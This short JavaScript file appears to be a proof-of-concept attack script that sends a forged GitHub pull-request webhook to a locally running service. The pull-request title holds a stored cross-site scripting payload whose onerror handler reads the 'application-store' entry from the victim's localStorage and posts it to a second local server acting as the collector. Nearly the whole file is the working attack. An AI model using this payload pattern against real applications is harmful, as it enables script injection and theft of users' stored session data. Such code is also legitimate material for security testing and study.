const sendData = async () => {
  const data = {
    action: "opened",
    pull_request: {
      number: 8,
      node_id: "123",
      title: `<img src="" onerror="const data = localStorage.getItem('application-store');fetch('http://localhost:8001', { method: 'POST',headers: {'Content-Type': 'application/json'},body: data});"/>`,
      body: "Body",
    },
  };

  fetch("http://localhost:8000/prs/webhook", {
    method: "POST",
    headers: {
      "X-Github-Event": "pull_request",
      "Content-Type": "application/json",
    },
    body: JSON.stringify(data),
  });
};

sendData();
